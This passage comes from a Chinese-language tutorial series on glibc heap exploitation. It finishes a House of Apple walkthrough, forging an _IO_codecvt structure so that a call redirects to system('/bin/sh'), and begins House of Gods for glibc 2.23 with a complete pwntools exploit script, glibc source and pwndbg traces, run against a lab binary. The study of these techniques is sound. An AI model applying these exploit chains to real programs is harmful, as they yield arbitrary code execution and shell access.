      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _IO_last_state = {
    __count = 0x0,
    __value = {
      __wch = 0x0,
      __wchb = {0x0, 0x0, 0x0, 0x0}
    }
  },
  _codecvt = {
    __codecvt_destr = 0x0,
    __codecvt_do_out = 0x0,
    __codecvt_do_unshift = 0x0,
    __codecvt_do_in = 0x0,
    __codecvt_do_encoding = 0x0,
    __codecvt_do_always_noconv = 0x0,
    __codecvt_do_length = 0x0,
    __codecvt_do_max_length = 0x0,
    __cd_in = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60fcdd65a0e8
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x60fcdd65a0e8
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    },
    __cd_out = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60fcdd65a128
      },
      __combined = {
        __cd = {
          __nsteps = 0x0,
          __steps = 0x0,
          __data = 0x60fcdd65a128
        },
        __data = {
          __outbuf = 0x0,
          __outbufend = 0x0,
          __flags = 0x0,
          __invocation_counter = 0x0,
          __internal_use = 0x0,
          __statep = 0x0,
          __state = {
            __count = 0x0,
            __value = {
              __wch = 0x0,
              __wchb = {0x0, 0x0, 0x0, 0x0}
            }
          }
        }
      }
    }
  },
  _shortbuf = {0x0},
  _wide_vtable = 0x0
}
pwndbg> 
```

在可控的堆内存地址（例如 `chunk0_addr + 0x200`），需要执行利用链的“最终装填”步骤：**完整伪造一个 `_IO_codecvt` 结构体**。此结构是整个利用链的**终极执行枢纽**，其内部的函数指针与数据指针将直接决定控制流的最终跳转地址与执行参数，从而实现从复杂的IO状态机处理到任意代码执行的质变。

**该伪造结构的具体布局、赋值与决定性作用如下：**

1.  **植入最终执行指令**： **`__codecvt_do_encoding` 函数指针**
    *   **操作**：将此指针项设置为希望最终执行的函数地址。通常是二者择一：
        *   **`system` 函数的地址**：用于执行任意系统命令，是获取shell的通用方法。
        *   一个满足约束条件的 **`one_gadget` 地址**：用于直接跳转到libc中一段能够启动shell的现有代码片段。
    *   **核心利用作用**：在 `_IO_wfile_sync` 函数的特定执行路径中，为查询或处理宽字符流的编码属性，会调用与此文件流关联的 `_codecvt` 结构中的对应函数，即执行 **`(*cv->__codecvt_do_encoding) (cv)`** 调用。由于此前已完全控制 `cv` 指针所指向的内存，此调用将**毫无阻碍地跳转**到预设的 `system` 或 `one_gadget` 地址，从而彻底接管程序的控制流。

2.  **提供利用执行参数**： **`__codecvt_destr` 指针**
    *   **操作**：将此指针项设置为字符串 **`“/bin/sh”`**。
    *   **核心利用作用**：当上述 `__codecvt_do_encoding` 被调用时，其第一个参数 `cv` 正是这个伪造的 `_IO_codecvt` 结构体的地址。在 `system` 函数的调用约定中，`cv` 被作为第一个参数（即命令字符串指针）传递给 `system`。由于将 `__codecvt_destr` 指针精心布置在结构体起始位置附近，并使其设置为字符串 `“/bin/sh”`，因此对 `system(cv)` 的调用，在内存解析上即等同于执行 **`system(“/bin/sh”)`**，从而成功获得shell。

**总结**：此步骤是完成整个复杂利用链的“最后击发准备”。通过在可控内存中原子级精确地伪造 `_IO_codecvt` 结构，并将其核心的**跳转指针**和**参数指针**分别指向恶意代码与命令字符串，成功地将glibc内部一个用于字符编码查询的合法函数调用，劫持并转化为一次可靠、可控的任意命令执行。这是整个House of Apple利用链中，从“布局”与“污染”阶段迈入实际“代码执行”阶段的最终临门一脚。

```bash
pwndbg> p/x *(struct _IO_codecvt*)0x60fcdd65a200
$5 = {
  __codecvt_destr = 0x68732f6e69622f,
  __codecvt_do_out = 0x0,
  __codecvt_do_unshift = 0x0,
  __codecvt_do_in = 0x0,
  __codecvt_do_encoding = 0x7b7c2a03c3eb,
  __codecvt_do_always_noconv = 0x0,
  __codecvt_do_length = 0x0,
  __codecvt_do_max_length = 0x0,
  __cd_in = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x60fcdd65a250
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60fcdd65a250
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  },
  __cd_out = {
    __cd = {
      __nsteps = 0x0,
      __steps = 0x0,
      __data = 0x60fcdd65a290
    },
    __combined = {
      __cd = {
        __nsteps = 0x0,
        __steps = 0x0,
        __data = 0x60fcdd65a290
      },
      __data = {
        __outbuf = 0x0,
        __outbufend = 0x0,
        __flags = 0x0,
        __invocation_counter = 0x0,
        __internal_use = 0x0,
        __statep = 0x0,
        __state = {
          __count = 0x0,
          __value = {
            __wch = 0x0,
            __wchb = {0x0, 0x0, 0x0, 0x0}
          }
        }
      }
    }
  }
}
pwndbg> x/5i 0x7b7c2a03c3eb
   0x7b7c2a03c3eb <__libc_system>:      sub    rsp,0x8
   0x7b7c2a03c3ef <__libc_system+4>:    test   rdi,rdi
   0x7b7c2a03c3f2 <__libc_system+7>:    jne    0x7b7c2a03c40a <__libc_system+31>
   0x7b7c2a03c3f4 <__libc_system+9>:    lea    rdi,[rip+0x11a980]        # 0x7b7c2a156d7b
   0x7b7c2a03c3fb <__libc_system+16>:   call   0x7b7c2a03be36 <do_system>
pwndbg> x/s 0x60fcdd65a200
0x60fcdd65a200: "/bin/sh"
pwndbg> 
```

整个利用链的最终引爆，始于一次主动触发的堆分配错误。**再次释放**已位于large bin中的`chunk[0]`，会立即触发glibc的**双重释放检测**。分配器在`_int_free`函数中识别到该异常，随即调用 **`malloc_printerr`** 函数进入错误处理流程。

`malloc_printerr`在准备输出错误信息时，会调用 **`_IO_flush_all_lockp`** 函数，以强制刷新所有已打开的IO流。此函数会遍历由全局指针`_IO_list_all`管理的IO链表。由于此前通过Large Bin Attack已将该指针劫持为指向`chunk[2]`，因此遍历直接从我们预先伪造的`_IO_FILE_plus`结构开始。

当执行流抵达`chunk[2]`处的伪造结构时，IO层会根据其`_mode`、`_IO_write_ptr`与`_IO_write_base`等字段进行状态判断。得益于前期的精确布局，该伪造结构被识别为一个“有待刷新输出缓冲区”的活跃文件流。

这一判定导致IO层通过该结构的虚表调用其 **`_IO_OVERFLOW`** 函数。尽管伪造结构的`_mode`等字段将其呈现为一个窄字符流，但我们将虚表指针设置为 **`_IO_wfile_jumps`**，这导致实际执行的是该表中的宽字符文件同步函数—— **`_IO_wfile_sync`**。

至此，控制流从通用的堆错误处理路径，被无缝导入预设的、以宽字符文件同步为起点的利用链。这标志着利用从复杂的前期布局阶段，正式进入按计划执行的引爆阶段。

```bash
In file: /home/bogon/workSpaces/glibc/libio/genops.c:786
   780 #if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T
   781            || (_IO_vtable_offset (fp) == 0
   782                && fp->_mode > 0 && (fp->_wide_data->_IO_write_ptr
   783                                     > fp->_wide_data->_IO_write_base))
   784 #endif
   785            )
 ► 786           && _IO_OVERFLOW (fp, EOF) == EOF)
 
 ► 0x7b7c2a06de45 <_IO_flush_all_lockp+413>    call   qword ptr [rax + 0x18]      <_IO_wfile_sync>
        rdi: 0x60fcdd65a940 ◂— 0
```

当控制流进入 **`_IO_wfile_sync`** 函数后，利用进入最后的执行阶段。此前在伪造的`_IO_wide_data`结构中对关键指针的精心布局，此刻发挥了决定性作用，引导执行流穿越函数内部的检查，精准地抵达恶意代码执行点。

**具体的路径控制与利用逻辑如下：**

1.  **主动规避写入路径，避免旁路干扰**：
    *   函数首先检查宽字符输出缓冲区状态：`if (fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base)`。此检查旨在判断是否有待写入的宽字符数据，若成立可能进入复杂的写入处理逻辑。
    *   由于我们已将`_IO_write_ptr`预设为`2`，`_IO_write_base`预设为`3`，使得`_IO_write_ptr > _IO_write_base`的条件（`2 > 3`）**明确不成立**。此举 **主动地、策略性地绕过**了与数据写入相关的处理分支，确保了执行流不会陷入无关或可能提前结束的复杂IO操作，而是继续流向我们预设的、更简单的路径。

2.  **利用预设的`delta`值，强制触发目标分支**：
    *   函数随后计算 `delta = fp->_wide_data->_IO_read_ptr - fp->_wide_data->_IO_read_end;`。这是一个关键的计算，其值直接控制后续分支。
    *   我们在布局时已将`_IO_read_ptr`设为`0xffffffffffffffff`（极大值），`_IO_read_end`设为`2`。无论具体数值如何解释（有符号或无符号），两者巨大的差值使得`delta`的计算结果**绝对不可能为0**。这是一个精心构造的、**恒为真的条件**。
    *   随后的判断 `if (delta != 0)` 因此**必然成立**。这迫使执行流进入处理“`delta`非零”情况的特定代码块。这个块，正是此前铺设的“陷阱”——其中包含了对关联的`_codecvt`结构体中间接函数指针的调用。

3.  **触发最终跳转，完成代码执行**：
    *   在上述分支中，代码调用 **`(*cv->__codecvt_do_encoding) (cv)`**。这里的`cv`是指向伪造`_IO_codecvt`结构的指针。
    *   由于此前已完全控制该结构，并将`__codecvt_do_encoding`指针设置为`system`地址，同时将`__codecvt_destr`指针设置为字符串`“/bin/sh”`，此调用被无缝地转化为 **`system(“/bin/sh”)`** 的执行。

**利用完成**：至此，整个从堆布局、信息泄露、全局指针劫持、到精密伪造多重IO数据结构并引导复杂内部函数链的漫长利用宣告成功。通过对`_IO_wfile_sync`内部两个检查点的精确操控（一个使其不成立以绕行，一个使其恒成立以触发），从而将一次看似平常的文件流同步操作，转化为获取目标系统**完整shell控制权**的可靠通道。这标志着House of Apple此种变体利用链的完美实现。

```bash
In file: /home/bogon/workSpaces/glibc/libio/wfileops.c:516
   510     {
   511       /* We have to find out how many bytes we have to go back in the
   512          external buffer.  */
   513       struct _IO_codecvt *cv = fp->_codecvt;
   514       _IO_off64_t new_pos;
   515 
 ► 516       int clen = (*cv->__codecvt_do_encoding) (cv);
 
 ► 0x7b7c2a06785a <_IO_wfile_sync+121>    call   qword ptr [r12 + 0x20]      <system>
        command: 0x60fcdd65a200 ◂— 0x68732f6e69622f /* '/bin/sh' */
```


### 1-42 house of gods其一

本方法是一种针对 glibc 2.23-2.26 版本的高度复杂的堆利用技术。它通过精巧的布局将多种堆利用原语串联，逐步劫持堆分配器的核心管理结构，最终实现对任意地址的分配控制。

#### 一、 核心目标
该技术的终极目标是**劫持当前线程的`thread_arena`指针**，使其指向一个完全可控的伪造`malloc_state`（arena）结构，从而获得"分配器级"权限，能够从任意地址（如`__free_hook`）分配内存，为后续代码执行奠定基础。

相关glibc完整源码参见[arena.c](https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/arena.c#L937)：

```c
/* Lock and return an arena that can be reused for memory allocation.
   Avoid AVOID_ARENA as we have already failed to allocate memory in
   it and it is currently locked.  */
static mstate
reused_arena (mstate avoid_arena)
{
  mstate result;
  /* FIXME: Access to next_to_use suffers from data races.  */
  static mstate next_to_use;
  if (next_to_use == NULL)
    next_to_use = &main_arena;

  /* Iterate over all arenas (including those linked from
     free_list).  */
  result = next_to_use;
  do
    {
      if (!arena_is_corrupt (result) && !mutex_trylock (&result->mutex))
        goto out;

      /* FIXME: This is a data race, see _int_new_arena.  */
      result = result->next;
    }
  while (result != next_to_use);

  /* Avoid AVOID_ARENA as we have already failed to allocate memory
     in that arena and it is currently locked.   */
  if (result == avoid_arena)
    result = result->next;

  /* Make sure that the arena we get is not corrupted.  */
  mstate begin = result;
  while (arena_is_corrupt (result) || result == avoid_arena)
    {
      result = result->next;
      if (result == begin)
	break;
    }

  /* We could not find any arena that was either not corrupted or not the one
     we wanted to avoid.  */
  if (result == begin || result == avoid_arena)
    return NULL;

  /* No arena available without contention.  Wait for the next in line.  */
  LIBC_PROBE (memory_arena_reuse_wait, 3, &result->mutex, result, avoid_arena);
  (void) mutex_lock (&result->mutex);

out:
  /* Attach the arena to the current thread.  Note that we may have
     selected an arena which was on free_list.  */
  {
    /* Update the arena thread attachment counters.   */
    mstate replaced_arena = thread_arena;
    (void) mutex_lock (&free_list_lock);
    detach_arena (replaced_arena);
    ++result->attached_threads;
    (void) mutex_unlock (&free_list_lock);
  }

  LIBC_PROBE (memory_arena_reuse, 2, result, avoid_arena);
  thread_arena = result;
  next_to_use = result->next;

  return result;
}

static mstate
internal_function
arena_get2 (size_t size, mstate avoid_arena)
{
  mstate a;

  static size_t narenas_limit;

  a = get_free_list ();
  if (a == NULL)
    {
      /* Nothing immediately available, so generate a new arena.  */
      if (narenas_limit == 0)
        {
          if (mp_.arena_max != 0)
            narenas_limit = mp_.arena_max;
          else if (narenas > mp_.arena_test)
            {
              int n = __get_nprocs ();

              if (n >= 1)
                narenas_limit = NARENAS_FROM_NCORES (n);
              else
                /* We have no information about the system.  Assume two
                   cores.  */
                narenas_limit = NARENAS_FROM_NCORES (2);
            }
        }
    repeat:;
      size_t n = narenas;
      /* NB: the following depends on the fact that (size_t)0 - 1 is a
         very large number and that the underflow is OK.  If arena_max
         is set the value of arena_test is irrelevant.  If arena_test
         is set but narenas is not yet larger or equal to arena_test
         narenas_limit is 0.  There is no possibility for narenas to
         be too big for the test to always fail since there is not
         enough address space to create that many arenas.  */
      if (__glibc_unlikely (n <= narenas_limit - 1))
        {
          if (catomic_compare_and_exchange_bool_acq (&narenas, n + 1, n))
            goto repeat;
          a = _int_new_arena (size);
	  if (__glibc_unlikely (a == NULL))
            catomic_decrement (&narenas);
        }
      else
        a = reused_arena (avoid_arena);
    }
  return a;
}

static mstate
arena_get_retry (mstate ar_ptr, size_t bytes)
{
  LIBC_PROBE (memory_arena_retry, 2, bytes, ar_ptr);
  if (ar_ptr != &main_arena)
    {
      (void) mutex_unlock (&ar_ptr->mutex);
      /* Don't touch the main arena if it is corrupt.  */
      if (arena_is_corrupt (&main_arena))
	return NULL;

      ar_ptr = &main_arena;
      (void) mutex_lock (&ar_ptr->mutex);
    }
  else
    {
      (void) mutex_unlock (&ar_ptr->mutex);
      ar_ptr = arena_get2 (bytes, ar_ptr);
    }

  return ar_ptr;
}

void *
__libc_malloc (size_t bytes)
{
  mstate ar_ptr;
  void *victim;

  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));

  arena_get (ar_ptr, bytes);

  victim = _int_malloc (ar_ptr, bytes);
  /* Retry with another arena only if we were able to find a usable arena
     before.  */
  if (!victim && ar_ptr != NULL)
    {
      LIBC_PROBE (memory_malloc_retry, 1, bytes);
      ar_ptr = arena_get_retry (ar_ptr, bytes);
      victim = _int_malloc (ar_ptr, bytes);
    }

  if (ar_ptr != NULL)
    (void) mutex_unlock (&ar_ptr->mutex);

  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
  return victim;
}
libc_hidden_def (__libc_malloc)
```

测试的二进制源码参考[binary.c](https://github.com/BinRacer/pwn4heap/tree/master/src/2.23/binary/14/binary.c)，相关exoloit.py完整内容可见[exploit.py](https://github.com/BinRacer/pwn4heap/blob/master/src/2.23/house_of_gods/exploit.py)。

核心利用代码如下：

```python
# house of gods
conn.sendafter(b"Enter author name: ", b"A" * 0x8)
malloc(0, 0x88)  # SMALLCHUNK
malloc(1, 0x18)  # FAST20
malloc(2, 0x38)  # FAST40
malloc(3, 0x98)  # INTM
malloc(4, 0x88)
delete(0)
delete(3)
content = show(0)
main_arena88 = u64(content[:6].ljust(8, b"\x00"))
log.info(f"main_arena+88: {hex(main_arena88)}")
libc.address = main_arena88 - 0x38DB78
log.info(f"libc base: {hex(libc.address)}")
main_arena = libc.sym["main_arena"]
log.info(f"main_arena addr: {hex(main_arena)}")
system = libc.sym["system"]
log.info(f"system addr: {hex(system)}")
__realloc_hook = libc.sym["__realloc_hook"]
log.info(f"__realloc_hook addr: {hex(__realloc_hook)}")
narenas = libc.sym["narenas"]
log.info(f"narenas addr: {hex(narenas)}")
binmap = main_arena88 + 0x800
log.info(f"binmap addr: {hex(binmap)}")
binsh_addr = next(libc.search(b"/bin/sh"))
log.info(f"binsh addr: {hex(binsh_addr)}")

edit(0, 0x8, b"A" * 0x8)
content = show(0)
chunk3_addr = u64(content[8 : 8 + 6].ljust(8, b"\x00"))
log.info(f"chunk3 addr: {hex(chunk3_addr)}")
chunk0_addr = chunk3_addr - 0x40 - 0x20 - 0x90
log.info(f"chunk0 addr: {hex(chunk0_addr)}")
chunk1_addr = chunk0_addr + 0x90
log.info(f"chunk1 addr: {hex(chunk1_addr)}")
chunk2_addr = chunk0_addr + 0x90 + 0x20
log.info(f"chunk2 addr: {hex(chunk2_addr)}")
edit(0, 0x8, p64(main_arena88))
malloc(3, 0x98)  # INTM
malloc(0, 0x88)  # SMALLCHUNK
delete(4)

delete(0)
payload = p64(main_arena88) + p64(binmap - 0x8)
edit(0, len(payload), payload)
payload = p64(0) + p64(chunk3_addr)
edit(2, len(payload), payload)
delete(1)
delete(2)
malloc(4, 0x1F8)  # BINMAP
payload = p64(main_arena88) + p64(narenas - 0x10)
edit(3, len(payload), payload)
payload = p64(main_arena88) + p64(main_arena)
payload += p64(0) + p64(1)
payload += p64(0xFFFFFFFFFFFFFFFF) + p64(0x7FFFFFFFFFFFFFFF)
edit(4, len(payload), payload)
malloc(3, 0x98)  # INTM
payload = p64(0) + p64(chunk3_addr)
edit(4, len(payload), payload)
malloc(5, 0xFFFFFFFFFFFFFFBF + 1)
malloc(5, 0xFFFFFFFFFFFFFFBF + 1)
payload = b"\x00" * 0x20 + p64(__realloc_hook - 0x11)
edit(3, len(payload), payload)
malloc(5, 0x68)
payload = b"\x00" + p64(system)
edit(5, len(payload), payload)
edit(0, 0x8, b"/bin/sh\x00")
realloc(0, 0x18)
cmd = b"cat src/2.23/house_of_gods/flag\x00"
conn.sendline(cmd)
flag = conn.recvline().decode().strip()
log.success(f"flag: {format_flag(flag)}")
```

#### 二、 完整利用链条

##### 第一阶段：信息收集与基础布局

在House of Gods利用链的初始阶段，通过一系列精密的堆操作，为后续利用奠定地址信息基础。具体步骤如下：

1. **精心构造堆布局**：
   - 依次分配五个关键堆块：`chunks[0]`、`chunks[1]`、`chunks[2]`、`chunks[3]`、`chunks[4]`
   - 各块尺寸设计：`chunks[0]`大小为0x88字节，属于small bin范围（大于fast bin上限0x80）；`chunks[1]`（0x18字节）和`chunks[2]`（0x38字节）为fast bin大小；

2. **释放关键块至unsorted bin**：
   - 先后释放`chunks[0]`和`chunks[3]`。由于它们的尺寸均超出fast bin管理范围，且不与top chunk相邻，均被置入**unsorted bin**——glibc中暂存中等大小空闲块的双向循环链表
   - 此时unsorted bin中包含两个chunk，通过fd/bk指针形成双向链表：`head ↔ chunks[0] ↔ chunks[3] ↔ head`

3. **同时泄露libc与堆地址**：
   - **libc地址泄露**：读取`chunks[0]`的fd指针。当chunk位于unsorted bin时，其fd和bk指针被分配器设置为指向`main_arena`结构内部的特定位置（通常为`main_arena+88`）。由此可计算出libc基址
   - **堆地址泄露**：读取`chunks[0]`的bk指针。在双向链表中，该指针指向链表中的前一个chunk，即`chunks[3]`。由此直接获得一个堆内存地址，进而可推算出堆的完整布局

4. **信息的关键性**：
   - 泄露的libc地址为后续定位`narenas`、`__free_hook`等关键全局变量提供基准
   - 泄露的堆地址实现了精确计算各chunk的相对位置，为后续的元数据篡改和伪造结构布局提供必要参考

此阶段通过模拟正常的堆管理操作，在无需任何初始地址信息的情况下，成功获取了后续复杂利用链所依赖的两个核心地址：**libc基址**和**堆内存布局**，为实施后续的binmap污染、Unsorted Bin Attack等高级利用技术创造了先决条件。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5e65213fb000
Size: 0x90 (with flag bits: 0x91)
fd: 0x7a0be1f8db78
bk: 0x5e65213fb0f0

Allocated chunk
Addr: 0x5e65213fb090
Size: 0x20 (with flag bits: 0x20)

Allocated chunk | PREV_INUSE
Addr: 0x5e65213fb0b0
Size: 0x40 (with flag bits: 0x41)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5e65213fb0f0
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x5e65213fb000
bk: 0x7a0be1f8db78

Allocated chunk
Addr: 0x5e65213fb190
Size: 0x90 (with flag bits: 0x90)

Top chunk | PREV_INUSE
Addr: 0x5e65213fb220
Size: 0x20de0 (with flag bits: 0x20de1)

pwndbg> unsortedbin 
unsortedbin
all: 0x5e65213fb0f0 —▸ 0x5e65213fb000 —▸ 0x7a0be1f8db78 (main_arena+88) ◂— 0x5e65213fb0f0
pwndbg> p/x main_arena->binmap
$1 = {0x0, 0x0, 0x0, 0x0}
pwndbg> 
```

##### 第二阶段：污染`binmap`字段

在成功泄露libc与堆地址后，利用流程进入关键的 **`binmap`污染阶段**。此时unsorted bin中包含`chunks[0]`和`chunks[3]`两个空闲块。

执行以下操作以触发binmap的污染：
1.  **触发unsorted bin整理**：程序重新申请`chunks[3]`（0x98字节）。由于unsorted bin中`chunks[0]`的大小（0x90）无法满足此次0x98字节的请求，分配器必须对unsorted bin进行整理。
2.  **移动`chunks[0]`至small bin**：在整理过程中，`chunks[0]`因大小不匹配而被从unsorted bin中移除。依据其大小（0x90），它被归类并插入对应的**0x90 small bin**链表中。
3.  **`mark_bin`宏触发binmap位设置**：当chunk被移入small bin时，glibc会调用`mark_bin(m, i)`宏来标记该大小的bin为非空。`i`是bin的索引，对于0x90大小的chunk，其对应的索引使得`binmap`字段中的**特定比特位被置1**。在glibc 2.23-2.26版本中，此操作导致`main_arena`结构体内部偏移0x855处的`binmap`字段值变为 **`0x200`**。
4.  **制造“伪造chunk”的size字段**：这个`0x200`值恰好位于`main_arena+0x850`处，与chunk的size字段偏移对齐。因此，在`main_arena`内部，一个拥有“合法”size字段（0x200）的 **伪chunk**构造完成。同时，`main_arena.next`指针初始指向`main_arena`自身，恰好可作为该伪chunk的“合法”bk指针，为后续将其链入unsorted bin并绕过unlink检查创造了条件。

至此，通过一次精心的分配请求触发的unsorted bin整理，成功污染了`main_arena.binmap`，在堆管理器的核心数据结构内部埋下了一个可供后续利用的“伪造chunk”，为第三阶段的unsorted bin劫持奠定了基石。

```bash
pwndbg> smallbins 
smallbins
0x90: 0x5e65213fb000 —▸ 0x7a0be1f8dbf8 (main_arena+216) ◂— 0x5e65213fb000
pwndbg> p/x main_arena->binmap
$2 = {0x200, 0x0, 0x0, 0x0}
pwndbg> 
```

##### 第三阶段：构造伪chunk并链入unsorted bin

在成功污染`binmap`字段后，利用流程进入**unsorted bin链表的主动污染阶段**。目标是利用一个写后释放漏洞，将第二阶段在`main_arena`内部构造的伪chunk链入unsorted bin空闲链表，为后续分配该内存区域、获取`main_arena`写权限铺平道路。

按顺序执行以下精密操作：

1.  **回收small bin中的chunks[0]**：
    *   程序重新申请`chunks[0]`（0x88字节），从0x90 small bin中将其取回。这清空了该small bin，但保留了`binmap`中已被设置的比特位（值`0x200`），为伪chunk保留了“合法”的size标志。

2.  **清理堆顶布局，避免干扰**：
    *   释放`chunks[4]`。由于其物理位置可能与`top chunk`相邻，释放后会与`top chunk`合并。此步骤旨在**简化堆布局**，确保后续对unsorted bin的链入和分配操作不会受到无关空闲块（特别是位于堆顶附近的块）的干扰，保持利用环境干净、可控。

3.  **准备利用载体，制造写后释放条件**：
    *   再次释放`chunks[0]`。由于其尺寸适中，它被置入**unsorted bin**，成为后续利用的“载体”块。此时，获得了一次对该空闲块用户数据区（即其`fd`和`bk`指针所在位置）的**写后释放**操作机会。

4.  **篡改bk指针，链入伪chunk**：
    *   利用上述写后释放漏洞，**修改`chunks[0]->bk`指针为`p64(binmap - 0x8)`**。此操作将`chunks[0]`在unsorted bin链表中的后向指针，从原本指向`main_arena+88`，篡改为指向`main_arena`内部伪chunk的`bk`字段位置（`binmap - 0x8`）。这使得伪chunk被插入到`chunks[0]`之后，**成功将位于`main_arena`内部的伪chunk链入了unsorted bin**。

5.  **预先设置“修复”指针，维持链表完整性**：
    *   **修改`chunks[2]->bk`指针为`p64(chunk3_addr)`**。此时`chunks[2]`尚未释放，但此前预先污染了其`bk`指针。此操作的目的是为后续步骤做准备：当`chunks[2]`被释放时，其`bk`指针将指向`chunks[3]`的地址。在后续触发unsorted bin整理分配伪chunk后，这个预设的指针将帮助“修复”unsorted bin链表，使其头部能正确跳过已被取走的伪chunk，链向一个已分配的chunk（`chunks[3]`），从而避免链表崩溃，确保利用链稳定执行。

**至此，完成了对unsorted bin链表的主动污染与预先修复布局**：通过一次写后释放漏洞，将`main_arena`内部的伪chunk成功链入；并预先设置了后续用于维持链表完整性的指针。整个堆状态已准备好迎接下一次关键分配——从unsorted bin中“领取”位于`main_arena`内部的伪chunk，从而获得对`main_arena`结构体的直接写权限。

```bash
pwndbg> heap
Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5e65213fb000
Size: 0x90 (with flag bits: 0x91)
fd: 0x7a0be1f8db78
bk: 0x7a0be1f8e370

Allocated chunk
Addr: 0x5e65213fb090
Size: 0x20 (with flag bits: 0x20)

Allocated chunk | PREV_INUSE
Addr: 0x5e65213fb0b0
Size: 0x40 (with flag bits: 0x41)

Allocated chunk | PREV_INUSE
Addr: 0x5e65213fb0f0
Size: 0xa0 (with flag bits: 0xa1)

Top chunk | PREV_INUSE
Addr: 0x5e65213fb190
Size: 0x20e70 (with flag bits: 0x20e71)

pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8db78 (main_arena+88) ◂— 0x5e65213fb000
BK: 0x5e65213fb000 —▸ 0x7a0be1f8e370 (main_arena+2128) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0
pwndbg> x/4gx 0x5e65213fb000
0x5e65213fb000: 0x0000000000000000      0x0000000000000091
0x5e65213fb010: 0x00007a0be1f8db78      0x00007a0be1f8e370
pwndbg> x/4gx 0x5e65213fb0b0
0x5e65213fb0b0: 0x0000000000000000      0x0000000000000041
0x5e65213fb0c0: 0x0000000000000000      0x00005e65213fb0f0
pwndbg> 
```

##### 第四阶段：释放fast chunk，修复unsorted bin布局

在成功将位于`main_arena`内部的伪chunk链入unsorted bin后，利用流程进入关键的**布局修复阶段**。此阶段的目标是：**通过释放两个预先布局的fast chunk，利用其释放时在`main_arena`头部留下的元数据，巧妙地“修复”unsorted bin链表**。这确保了在后续分配伪chunk时，unsorted bin链表不会因头部指针异常而崩溃，维持了利用链的稳定性。

执行以下精确操作：

1.  **释放`chunks[1]`（0x20大小）至fast bin**：
    *   释放`chunks[1]`。由于它是0x20大小的fast chunk，其`fd`指针（原用户数据区起始8字节）被写入`main_arena.fastbinsY[0]`，同时也被写入`main_arena`头部的内存区域。**这个操作在`main_arena`起始处留下了一个有效的堆地址**，这将在后续被unsorted bin链表解析为一个“合法”的链表节点指针。
```bash
pwndbg> fastbins 
fastbins
0x20: 0x5e65213fb090 ◂— 0
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8db78 (main_arena+88) ◂— 0x5e65213fb000
BK: 0x5e65213fb000 —▸ 0x7a0be1f8e370 (main_arena+2128) —▸ 0x7a0be1f8db20 (main_arena) ◂— 0
pwndbg> 
```

2.  **释放`chunks[2]`（0x40大小）至fast bin**：
    *   释放`chunks[2]`。同样，其`fd`指针被写入`main_arena.fastbinsY[2]`及对应内存区域。**关键在于**，在第三阶段，已预先将`chunks[2]->bk`指针设置为`chunk3_addr`（即`chunks[3]`的地址）。当`chunks[2]`被释放时，其`bk`指针**并不会被fast bin机制覆盖或清零**，得以保留。因此，在`main_arena`头部附近的内存中，形成了一个由`chunks[2]`的`fd`和`bk`指针构成的、类似双向链表节点的结构。
```bash
pwndbg> fastbins 
fastbins
0x20: 0x5e65213fb090 ◂— 0
0x40: 0x5e65213fb0b0 ◂— 0
pwndbg> unsortedbin 
unsortedbin
all [corrupted]
FD: 0x5e65213fb000 —▸ 0x7a0be1f8db78 (main_arena+88) ◂— 0x5e65213fb000
BK: 0x5e65213fb000 —▸ 0x7a0be1f8e370 (main_arena+2128) —▸ 0x7a0be1f8db20 (main_arena) —▸ 0x5e65213fb0b0 —▸ 0x5e65213fb0f0 ◂— ...
pwndbg> 
```

**修复原理与效果**：
*   这两个fast chunk的释放，本质上是**在`main_arena`的起始区域，利用其`fd`指针和预设的`bk`指针，伪造了一段“看起来合理”的unsorted bin链表片段**。
*   当后续操作（第五阶段）从unsorted bin中分配走那个伪chunk（`binmap` chunk）时，unsorted bin的遍历指针（`victim->bk`）会指向`main_arena`起始处的这个伪造链表节点。
*   由于其`bk`指针已被预设为指向一个**已分配的、稳定的chunk**（`chunks[3]`），unsorted bin链表得以从此处继续安全地遍历下去，而不会因指向无效或已释放内存而触发崩溃。
*   这样就**提前化解了unsorted bin链表在关键节点（伪chunk）被移除后可能发生的断裂风险**，为第五阶段安全地分配`binmap` chunk并获取`main_arena`写权限，提供了稳定的堆状态保障。

**总结**：此阶段通过两次精确的fast chunk释放，将此前预先设置的指针“固化”到`main_arena`的关键内存位置，完成对unsorted bin链表逻辑结构的“外科手术式”修复，确保了整个复杂利用链在执行核心步骤时的鲁棒性。这是House of Gods技术中体现高度控制力的精妙步骤之一。

##### 第五阶段：获取写权限并篡改全局状态

